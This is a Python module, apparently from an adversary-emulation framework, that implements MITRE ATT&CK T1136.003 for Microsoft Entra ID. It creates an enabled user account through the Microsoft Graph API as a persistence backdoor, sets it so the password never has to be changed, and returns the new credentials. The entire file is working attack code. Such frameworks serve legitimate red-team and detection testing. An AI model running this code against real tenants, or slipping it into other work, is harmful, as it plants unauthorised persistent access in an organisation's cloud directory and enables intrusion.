from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraCreateBackdoorAccount(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1136.003",
                technique_name="Create Account",
                tactics=["Persistence"],
                sub_technique_name="Cloud Account"
            )
        ]
        super().__init__("Create Backdoor Account", "Create a new user account in Entra ID to mantain persistence", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            backdoor_display_name: str = kwargs.get('backdoor_display_name', None)
            backdoor_user_principal_name: str = kwargs.get('backdoor_user_principal_name', None)
            backdoor_password: str = kwargs.get('backdoor_password', None)
            
            if backdoor_display_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }
            if backdoor_user_principal_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }
            if backdoor_password in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }

            endpoint_url = "https://graph.microsoft.com/v1.0/users"
            
            # Generate user details
            mail_nickname = backdoor_display_name.replace(" ","")

            # Create request payload
            data = {"accountEnabled": 'true',"displayName": backdoor_display_name,"mailNickname": mail_nickname,"userPrincipalName": backdoor_user_principal_name,"passwordProfile" : {"forceChangePasswordNextSignIn": 'false',"password": backdoor_password}}
            

            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Create account successfull
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully created backdoor account {backdoor_user_principal_name}",
                    "value": {
                        "backdoor_upn" : backdoor_user_principal_name,
                        "password" : backdoor_password,
                        "backdoor_display_name" : backdoor_display_name,
                        "backdoor_enabled" : True
                    }
                }
            
            # Create account failed
            else:
                return ExecutionStatus.FAILURE, {
                    "error": {"error_code" : raw_response.json().get('error').get('code', 'N/A'), 
                              "error_message" :raw_response.json().get('error').get('message', 'N/A')
                              },
                    "message": "Failed to create backdoor account in tenant"
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to create backdoor account in tenant"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "backdoor_display_name": {"type": "str", "required": True, "default":None, "name": "Backdoor Display Name", "input_field_type" : "text"},
            "backdoor_user_principal_name": {"type": "str", "required": True, "default":None, "name": "Backdoor UPN", "input_field_type" : "email"},
            "backdoor_password": {"type": "str", "required": True, "default":None, "name": "Backdoor Password", "input_field_type" : "text"}
        }